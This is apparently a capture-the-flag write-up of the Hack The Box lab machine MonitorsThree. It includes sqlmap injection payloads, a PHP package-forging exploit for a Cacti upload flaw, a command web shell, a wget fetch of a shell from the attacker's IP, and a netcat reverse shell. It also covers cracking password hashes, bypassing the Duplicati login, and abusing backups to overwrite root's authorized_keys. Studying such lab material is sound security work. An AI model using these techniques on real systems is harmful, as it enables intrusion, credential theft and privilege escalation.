---
layout: post
title: "HTB: MonitorsThree"
box: monitorsthree
img: /img/monitorsthree/monitorsthree
author: Andrew Cherney
date: 2025-01-18
tags: htb medium-box season-6 linux webapp sqli crypto json php ssh-tunneling mysql sqlite3
icon: "assets/icons/monitorsthree.png"
post_description: "Though I did not hack the first two Monitor boxes I can say this one makes me want to go back and experience them firsthand. Starts with an SQLi for credentials to a subdomain, then uploading a package for custom php execution. With that shell the local database files can be used to login and dump the marcus user's password. As marcus a quick ssh tunnel allows the backup service Duplicati to be leveraged to backup and restore any root file effectively pwning the box."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.10.11.30

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.30:22
Open 10.10.11.30:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.30

Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-28 19:16 UTC
Initiating Ping Scan at 19:16
Scanning 10.10.11.30 [2 ports]
Completed Ping Scan at 19:16, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:16
Completed Parallel DNS resolution of 1 host. at 19:16, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:16
Scanning 10.10.11.30 [2 ports]
Discovered open port 22/tcp on 10.10.11.30
Discovered open port 80/tcp on 10.10.11.30
Completed Connect Scan at 19:16, 0.07s elapsed (2 total ports)
Nmap scan report for 10.10.11.30
Host is up, received syn-ack (0.061s latency).
Scanned at 2024-08-28 19:16:16 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


nmap -p 22,80 -sCV 10.10.11.30

Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-28 14:20 CDT
Nmap scan report for 10.10.11.30
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 - monitorsthree.htb

```bash
dirsearch -u http://monitorsthree.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/MonitorThree/reports/http_monitorsthree.htb/_24-08-28_14-22-06.txt

Target: http://monitorsthree.htb/

[14:22:06] Starting: 
[14:22:07] 301 -  178B  - /js  ->  http://monitorsthree.htb/js/
[14:22:24] 301 -  178B  - /admin  ->  http://monitorsthree.htb/admin/
[14:22:25] 403 -  564B  - /admin/
[14:22:47] 301 -  178B  - /css  ->  http://monitorsthree.htb/css/
[14:22:54] 301 -  178B  - /fonts  ->  http://monitorsthree.htb/fonts/
[14:22:58] 301 -  178B  - /images  ->  http://monitorsthree.htb/images/
[14:22:58] 403 -  564B  - /images/
[14:23:01] 403 -  564B  - /js/
[14:23:03] 200 -    4KB - /login.php
```

{% include img_link src="/img/monitorsthree/monitorsthree_front_page" alt="front_page" ext="png" trunc=600 %}

Poking around we can find a login page and nothing else. Heading to is there is a forgot password functionality and a non-descript login portal. 

![base login page]({{ page.img }}_login_page.png)

![forgot password]({{ page.img }}_forgot_password.png)

Since these login and forgot password fields are the only thing here for us to test I fuzz both for special characters. 

![forgot password fuzz]({{ page.img }}_forgot_pass_fuzz.png)

Seems we have a potential SQL injection vulnerability. I verify with a `' and 1='1` and I don't get an error. Simplest thing now is to run this through sqlmap and dig elsewhere.

```bash
sqlmap -r forgot_pass.req

---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=Administrator' OR NOT 1241=1241#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=Administrator' OR (SELECT 3419 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT (ELT(3419=3419,1))),0x716a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Agxl

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=Administrator';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Administrator' AND (SELECT 8534 FROM (SELECT(SLEEP(5)))SoWy)-- PUMK
---
```

```bash
sqlmap -r forgot_pass.req --dbs

available databases [2]:
[*] information_schema
[*] monitorsthree_db
```

```bash
sqlmap -r forgot_pass.req -D monitorsthree_db -T users --columns

Database: monitorsthree_db
Table: users
[9 columns]
+------------+---------------+
| Column     | Type          |
+------------+---------------+
| name       | varchar(100)  |
| position   | varchar(100)  |
| dob        | date          |
| email      | varchar(100)  |
| id         | int(11)       |
| password   | varchar(100)  |
| salary     | decimal(10,2) |
| start_date | date          |
| username   | varchar(50)   |
+------------+---------------+
```

```bash
sqlmap -r forgot_pass.req -D monitorsthree_db -T users --dump

Database: monitorsthree_db
Table: users
[4 entries]
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
```

That hash crackstations to greencacti2001. I login and am greeted with a basic task and invoice tracking portal. There are no usable buttons here but below is what it looks like.

{% include img_link src="/img/monitorsthree/monitorsthree_dashboard" alt="dashboard" ext="png" trunc=600 %}

![defunct invoice creation]({{ page.img }}_create_invoice.png)


# User as marcus

## Shell as www-data

### cacti packages

In my scanning I had yet to scan for subdomains and I suspect at this point there is one hidden here somewhere.

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -mc 200,302,401 -fs 13560

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302,401
 :: Filter           : Response size: 13560
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
```

```bash
dirsearch -u http://cacti.monitorsthree.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/MonitorThree/reports/http_cacti.monitorsthree.htb/_24-08-28_15-49-45.txt

Target: http://cacti.monitorsthree.htb/

[15:49:45] Starting: 
[15:50:11] 301 -  178B  - /app  ->  http://cacti.monitorsthree.htb/app/
[15:50:11] 200 -   13KB - /app/
[15:50:15] 200 -   14KB - /cacti/
[15:50:15] 301 -  178B  - /cacti  ->  http://cacti.monitorsthree.htb/cacti/
```

![cacti login page]({{ page.img }}_cacti_login_page.png)

Luckily for us the credentials of admin:greencacti2001 let us in.

![cacti dashboard]({{ page.img }}_cacti_dashboard.png)

Cacti as per [https://www.cacti.net/](https://www.cacti.net/) is an operational monitoring and management framework. From this dashboard we have the option to monitor, track, and graph information gathered from the nodes placed on devices. We can query that data in any way we wish and create new devices or import packages to run. 

![cacti data query]({{ page.img }}_cacti_data_query.png)

If you are familiar with shells from admin dashboards you probably know where this is going. The obvious check here for some remote code execution would be the package upload, but before that I tested [https://www.exploit-db.com/exploits/51740](https://www.exploit-db.com/exploits/51740) which in theory allows for the execution of arbitrary commands. Inside of an SNMP device template the "SNMP Community String" field would allow an escape to execute code in versions 1.2.24, sometimes. The application was not vulnerable to this from what I tested.  

Now, onto the package upload for rce. When searching for cacti 1.2.26 vulnerabilities you end up coming across [this github advisory about uploading phpinfo from a package.](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88). The upload functionality blindly trusts user supplied file names within XML and as such a php file can be uploaded to the source of the cacti installation. The exploit is to run a php file to create the malicious XML file then zip it. 

```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php phpinfo(); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

Next run the php file and upload the created .xml.gz file.

![cacti package import test]({{ page.img }}_cacti_package_import_test.png)

![cacti phpinfo]({{ page.img }}_cacti_test_php.png)

As of note here I had to upload a few times to get it to work. There is an auto-cleanup script happening so be sure to have a replay of the upload ready for when it cleans the cacti root directory. That said the exploit worked and I can upload any php file I desire. I'll upload a basic shell and upgrade it if I need to. I changed the php to `$filedata = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'` and tested with id:

![cacti php rce]({{ page.img }}_cacti_php_rce.png)

The solution I went with here was to upload a pentestmonkey shell for something more stable but still lightweight. In order I visited

```
http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=id
http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=wget%20http://10.10.14.12:8081/shell.php
http://cacti.monitorsthree.htb/cacti/resource/shell.php
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.30 42296
Linux monitorsthree 5.15.0-118-generic #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 21:43:57 up  7:42,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1141): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitorsthree:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## config.php + mysql

The next step here is to check for databases and config files we have access to. I found a cacti.sql database, but there was nothing useful within there (admin:admin credentials for whatever it supports). Config files are a great next place.

```bash
www-data@monitorsthree:/$ ls /var/www/html/cacti/*/* | grep config
ls /var/www/html/cacti/*/* | grep config
/var/www/html/cacti/include/config.php
/var/www/html/cacti/include/config.php.dist
```

```bash
/**
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

/**
 * When the cacti server is a remote poller, then these entries point to
 * the main cacti server. Otherwise, these variables have no use and
 * must remain commented out.
 */

#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';

/**
```

I'll need a better shell to access that mysql database w/o tunnelling some port. 

```bash
www-data@monitorsthree:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@monitorsthree:/$ ^Z
[1]+  Stopped                 nc -nvlp 7777

stty raw -echo; fg
nc -nvlp 7777
             export TERM=xterm
```

```bash
www-data@monitorsthree:/$ mysql -u cactiuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2675
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)

MariaDB [(none)]> use cacti
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [cacti]>
```

I did enumerate a lot more of the database but the important queries are underlined below.

```
MariaDB [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
...
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
...
+-------------------------------------+
MariaDB [cacti]> show columns in user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
...
+------------------------+-----------------------+------+-----+---------+----------------+
MariaDB [cacti]> select username,password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
+----------+--------------------------------------------------------------+
```

```bash
john hash --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678910      (?)
1g 0:00:00:02 DONE (2024-08-28 17:05) 0.4098g/s 191.8p/s 191.8c/s 191.8C/s 12345678910..christina
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


```bash
www-data@monitorsthree:/$ su marcus
Password: 
marcus@monitorsthree:/home$ cat /home/marcus/user.txt 
1472e3346c132-------------------
```

And to make my life easier I made an ssh keypair to ssh in with.

```bash
nano id_rsa
chmod 600 id_rsa 
ssh marcus@monitorsthree.htb -i id_rsa
```

# Root

## Duplicati

In my initial rounds of privesc enumeration I noticed some locally open ports that I did not expect. Namely ports 37337 and 8200. No processes seemed to be attached to them (from what we are permitted to see) and a curl to them gave odd results.

```bash
marcus@monitorsthree:~$ curl 127.0.0.1:8200
marcus@monitorsthree:~$ curl 127.0.0.1:37337
404: Page Not Found
```

I ended up not trusting the output of curl here and testing both ports after an ssh tunnel.

```bash
ssh marcus@monitorsthree.htb -i id_rsa -L 37337:localhost:37337
```

Heading to localhost:37337 yielded the 404 not found, dirsearch to find nothing.

```bash
ssh marcus@monitorsthree.htb -i id_rsa -L 8200:localhost:8200
```

![duplicati login page]({{ page.img }}_8200_login.png)

### login bypass

None of the credentials thus far give us access to this new service. Duplicati according to [its github](https://github.com/duplicati/duplicati) is a free and open source backup software. Searching for some vulnerabilities you will come across [https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee). This corresponds with an [issue on the duplicati github page](https://github.com/duplicati/duplicati/issues/5197). Due to the way that Duplicati handles passwords the server passphrase can be transformed and sent in lieu of a password to gain access to the service. This is however only possible if the attacker has local access to the machine Duplicati is hosted on.

My would you look at that opt directory named duplicati, convenient.

```bash
marcus@monitorsthree:~$ cd /opt/duplicati/config/
marcus@monitorsthree:/opt/duplicati/config$ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.14.12 - - [28/Aug/2024 22:28:43] "GET /Duplicati-server.sqlite HTTP/1.1" 200 -
```

```bash
wget http://monitorsthree.htb:8082/Duplicati-server.sqlite
--2024-08-28 17:28:39--  http://monitorsthree.htb:8082/Duplicati-server.sqlite
Resolving monitorsthree.htb (monitorsthree.htb)... 10.10.11.30
Connecting to monitorsthree.htb (monitorsthree.htb)|10.10.11.30|:8082... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90112 (88K) [application/vnd.sqlite3]
Saving to: ‘Duplicati-server.sqlite’

Duplicati-server.sqlite 100%[===============================>]  88.00K  --.-KB/s    in 0.1s    

2024-08-28 17:28:39 (683 KB/s) - ‘Duplicati-server.sqlite’ saved [90112/90112]

sqlite3 Duplicati-server.sqlite 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
Backup        Log           Option        TempFile    
ErrorLog      Metadata      Schedule      UIStorage   
Filter        Notification  Source        Version  
sqlite> select * from Option;
...
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|1c0061ec-26ef-49b4-a224-50809c955b87
-2||server-passphrase-trayicon-hash|EFPcHlfW3b3mOp63/ucoqBJjA7JVYvxVbToO9ne1z6g=
-2||last-update-check|638604505803998860
...
```

Next open up burp and intercept a login request with any password. Then right click the request and select `Do Intercept: Response to this request`. When you send that request the response will contain the generated nonce and the static salt. 

```json
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate, max-age=0
Date: Wed, 28 Aug 2024 22:37:04 GMT
Content-Length: 140
Content-Type: application/json
Server: Tiny WebServer
Connection: close
Set-Cookie: session-nonce=LxHJjjSzJkFpWtQY9tSBt%2FkXsqSg%2BaUPdvEqcszYzEQ%3D; expires=Wed, 28 Aug 2024 22:47:04 GMT;path=/; 

{
  "Status": "OK",
  "Nonce": "LxHJjjSzJkFpWtQY9tSBt/kXsqSg+aUPdvEqcszYzEQ=",
  "Salt": "xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I="
}
```

We can double check here to see if the salt matched the sqlite3 database. Next is the fun transforming the data part. As per the issue on github it needs to go from base64 to hex (we'll discuss that wording a bit later). The following commands can be run inside the dev console in firefox of chrome to generate the nonced and salted passphrase.

```javascript
var saltedpwd = '57 62 36 65 38 35 35 4c 33 73 4e 39 4c 54 61 43 75 77 50 58 75 61 75 74 73 77 54 49 51 62 65 6b 6d 4d 41 72 37 42 72 4b 32 48 6f 3d'  

undefined  

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('LxHJjjSzJkFpWtQY9tSBt/kXsqSg+aUPdvEqcszYzEQ=') + saltedpwd)).toString(CryptoJS.enc.Base64);  

undefined

console.log(noncedpwd)  

2ic0heA7qiXBUBRvxr/TDGllRl5DCAIX+3Gu0qaMwFE= [debugger eval code:1:9](chrome://devtools/content/webconsole/debugger eval code)
```

Grab that output and urlencode it then send it in the password parameter as part of the login request previously accepted. This try did not work however. I misread and misunderstood what base64 to hex meant. It needs to be base64 decoded, then encoded into hex with no spaces. Below is the proper output that gets me access.

```bash
var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'  

undefined  

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('VCLWPbfPo+9+re7YnNDau6k53XNiWugWZMotH5JnGMU=') + saltedpwd)).toString(CryptoJS.enc.Base64);  

undefined  

console.log(noncedpwd)  

aGTImE9FgmRBSjE7T6jVgCOLnuGQ6c9CFQJB5eh12x8=
```

### root LFI

![duplicati dashboard]({{ page.img }}_8200_dashboard.png)

The functionality of this service is as you would expect a backup service to be, tell it what to backup, then it backs it up. Something useful that this solution has for our case is it can restore files. We do not know what user is running duplicati or what permissions it has, but we can effectively read anything the service can read with the assumption we can restore files. Firstly I'll need to understand how to backup something so I export the json config of the current backup.

![duplicati export json config]({{ page.img }}_8200_export_config.png)

```json
{
  "CreatedByVersion": "2.0.8.1",
  "Schedule": {
    "ID": 1,
    "Tags": [
      "ID=4"
    ],
    "Time": "2024-08-29T11:00:00Z",
    "Repeat": "1D",
    "LastRun": "2024-08-28T14:02:00Z",
    "Rule": "AllowedWeekDays=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday",
    "AllowedDays": [
      "mon",
      "tue",
      "wed",
      "thu",
      "fri",
      "sat",
      "sun"
    ]
  },
  "Backup": {
    "ID": "4",
    "Name": "Cacti 1.2.26 Backup",
    "Description": "",
    "Tags": [],
    "TargetURL": "file:///source/opt/backups/cacti/",
    "DBPath": "/config/CTADPNHLTC.sqlite",
    "Sources": [
      "/source/var/www/html/cacti/"
    ],
    "Settings": [
      {
        "Filter": "",
        "Name": "encryption-module",
        "Value": "",
        "Argument": null
      },
      {
        "Filter": "",
        "Name": "compression-module",
        "Value": "zip",
        "Argument": null
      },
      {
        "Filter": "",
        "Name": "dblock-size",
        "Value": "50mb",
        "Argument": null
      },
      {
        "Filter": "",
        "Name": "--no-encryption",
        "Value": "true",
        "Argument": null
      }
    ],
    "Filters": [],
    "Metadata": {
      "LastBackupDate": "20240828T225700Z",
      "BackupListCount": "4",
      "TotalQuotaSpace": "8350261248",
      "FreeQuotaSpace": "2230845440",
      "AssignedQuotaSpace": "-1",
      "TargetFilesSize": "20365382",
      "TargetFilesCount": "12",
      "TargetSizeString": "19.42 MB",
      "SourceFilesSize": "63516519",
      "SourceFilesCount": "3865",
      "SourceSizeString": "60.57 MB",
      "LastBackupStarted": "20240828T225716Z",
      "LastBackupFinished": "20240828T225720Z",
      "LastBackupDuration": "00:00:04.3431230",
      "LastErrorDate": "20240820T111518Z",
      "LastErrorMessage": "Found 12 remote files that are not recorded in local storage, please run repair",
      "LastCompactDuration": "00:00:00.0268700",
      "LastCompactStarted": "20240828T225705Z",
      "LastCompactFinished": "20240828T225705Z"
    },
    "IsTemporary": false
  },
  "DisplayNames": {
    "/source/var/www/html/cacti/": "cacti"
  }
}
```

Files and locations within this json are designated with /source before them. TargetURL and Sources within Backup are the fields relevant here. I change then to `file:///source/tmp/root/`, `/source/root/root.txt` respectively. I also changed the display name and Name for differentiation sake. After prepping the file we go through the wizard after importing the config file. Make a note that the destination came out right, in some instances for me it imported improperly.

![duplicati add backup]({{ page.img }}_8200_add_backup.png)

My test here is to check that a root folder was created within /tmp. Before the backup there are test files I was messing around with, but not root directory.

```bash
marcus@monitorsthree:/opt/duplicati/config$ ls /tmp
cacti
duplicati-20240828T231431Z.dlist.zip
duplicati-bf85a9dcc9ec64a619b7d009f5ac4361f.dblock.zip
duplicati-i8ae5c81a9c934487aa5aa30e97b245e0.dindex.zip
f
systemd-private-21a3a943f2754902a50a9f7971aa545c-ModemManager.service-Yk8RTy
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-logind.service-5AtAbB
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-resolved.service-K8lcen
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-timesyncd.service-wTTjXF
systemd-private-21a3a943f2754902a50a9f7971aa545c-upower.service-rkMpnM
tmux-1000
vmware-root_623-4022112112
www-data-temp-aspnet-0
```

![duplicati root test]({{ page.img }}_8200_root_test_run.png)

Pressing run now on the root test backup did not cause any errors. And in /tmp there is a new root directory.

```bash
marcus@monitorsthree:/tmp$ ls
cacti
duplicati-20240828T231431Z.dlist.zip
duplicati-20240828T232208Z.dlist.zip
duplicati-bf85a9dcc9ec64a619b7d009f5ac4361f.dblock.zip
duplicati-i8ae5c81a9c934487aa5aa30e97b245e0.dindex.zip
f
root
systemd-private-21a3a943f2754902a50a9f7971aa545c-ModemManager.service-Yk8RTy
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-logind.service-5AtAbB
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-resolved.service-K8lcen
systemd-private-21a3a943f2754902a50a9f7971aa545c-systemd-timesyncd.service-wTTjXF
systemd-private-21a3a943f2754902a50a9f7971aa545c-upower.service-rkMpnM
tmux-1000
vmware-root_623-4022112112
www-data-temp-aspnet-0
marcus@monitorsthree:/tmp$ cd root
marcus@monitorsthree:/tmp/root$ ls
```

Now we can restore the backup and assuming this has access to /root we get the flag. Be sure to pick the restore location to where you are exfiltrating the data to, the format being **/source/tmp/root**. 

![duplicati restore]({{ page.img }}_8200_restore.png)

```bash
marcus@monitorsthree:~$ ls /tmp/root
duplicati-20240828T232902Z.dlist.zip
duplicati-bd700acf598ef45dea697b8444e3d9ddc.dblock.zip
duplicati-i4523c642a672487d9f12e001192cd513.dindex.zip
root.txt
marcus@monitorsthree:~$ cat /tmp/root/root.txt
abf9381c5f92--------------------
```

# Root shell

## Overwriting authorized_keys

But this isn't the end here. We have two functions afforded to us from Duplicati with root access: reading files, and writing files. My initial thought here is to create a backup of an authorized_keys file I create, then restoring it into the /root/.ssh directory. For this to work the restore function needs to overwrite files.

I'll test this out by creating a directory named **trashcan** and placing the file **garbage** into it. Then I will make the backup location directory **dumpster** with the file **garbage** inside of it. I'll place the appropriate directory name in the garbage files and then backup the **trashcan/garbage** file. When I restore the file I can check the output to see what working directory the **garbage** file is from. 

```bash
# The Setup

cd /tmp
mkdir trashcan
echo trashcan > trashcan/garbage
mkdir dumpster
echo dumpster > dumpster/garbage
```

Within the json I need to change the *TargetURL* to **file://source/tmp/dumpster** and the *Sources* in *Backup* to **/source/tmp/trashcan/garbage**. I'll change the restore file location to **/source/tmp/dumpster** after importing the new json. I also changed the *DisplayNames* json to **"/source/tmp/trashcan/garbage": "garbage"**. Inside of the restore wizard there is an overwrite option which is a good sign this will succeed. Now we import, backup, and restore to the location of **/source/tmp/dumpster** and cross our fingers.

```bash
marcus@monitorsthree:/tmp$ cat dumpster/garbage 
trashcan
```

We can overwrite so now it's time to try and smuggle an authorized_keys file into .ssh of root. *TargetURL* is **file:///source/root/.ssh**, *Sources* is **/source/tmp/trashcan/authorized_keys**, *DisplayNames* json set to **/source/tmp/trashcan/authorized_keys": "authorized_keys"**. Change the restore location to **/source/root/.ssh**, and finally place my authorized_keys file within **/tmp/trashcan**.

```bash
ssh -i root root@monitorsthree.htb

Last login: Tue Aug 20 15:21:21 2024
root@monitorsthree:~# 
```
